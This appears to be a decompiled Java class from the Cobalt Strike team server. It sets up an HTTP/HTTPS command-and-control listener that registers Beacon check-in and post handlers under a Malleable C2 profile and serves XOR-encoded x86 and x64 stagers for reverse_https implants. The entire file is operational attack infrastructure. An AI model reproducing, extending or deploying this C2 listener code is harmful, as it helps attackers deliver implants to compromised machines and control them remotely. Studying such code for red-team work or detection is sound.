package beacon.c2setup;

import beacon.BeaconC2;
import beacon.BeaconHTTP;
import c2profile.MalleableHook;
import c2profile.MalleableStager;
import cloudstrike.WebServer;
import common.ArtifactUtils;
import common.ScListener;
import server.Resources;
import server.ServerUtils;
import server.WebCalls;

public class BeaconSetupHTTP extends BeaconSetupC2 {
    protected WebCalls web = null;

    protected int port = 0;

    protected boolean ssl = false;

    protected BeaconHTTP handler = null;

    public BeaconSetupHTTP(Resources resources, ScListener scListener, BeaconC2 beaconC2) {
        super(resources, scListener, beaconC2);
        this.web = ServerUtils.getWebCalls(this.resources);
        this.port = scListener.getBindPort();
        this.ssl = "windows/beacon_https/reverse_https".equals(scListener.getPayload());
    }

    public void start() throws Exception {
        this.handler = new BeaconHTTP(getListener(), getProfile(), getController());
        WebServer webServer = this.ssl ? this.web.getSecureWebServer(getProfile(), this.port) : this.web.getWebServer(this.port);
        if (webServer.isRegistered("beacon.http-get") || webServer.isRegistered("beacon.http-post") || webServer.isRegistered("stager") || webServer.isRegistered("stager64"))
            throw new RuntimeException("Another Beacon listener exists on port " + this.port);
        MalleableHook malleableHook = new MalleableHook(getProfile(), "beacon", "beacon handler");
        malleableHook.setup(webServer, ".http-get", this.handler.getGetHandler());
        malleableHook = new MalleableHook(getProfile(), "beacon", "beacon post handler");
        malleableHook.setup(webServer, ".http-post", this.handler.getPostHandler());
        if (getProfile().option(".host_stage")) {
            byte[] arrby1 = ArtifactUtils.XorEncode(this.listener.export("x86"), "x86");
            MalleableStager malleableStager1 = new MalleableStager(getProfile(), ".http-stager", arrby1, "x86");
            malleableStager1.setup(webServer, "stager");
            byte[] arrby2 = ArtifactUtils.XorEncode(this.listener.export("x64"), "x64");
            MalleableStager malleableStager2 = new MalleableStager(getProfile(), ".http-stager", arrby2, "x64");
            malleableStager2.setup(webServer, "stager64");
        }
        this.web.broadcastSiteModel();
    }

    public void stop() throws Exception {
        this.web.deregister(this.port, "beacon.http-get");
        this.web.deregister(this.port, "beacon.http-post");
        this.web.deregister(this.port, "stager");
        this.web.deregister(this.port, "stager64");
    }
}
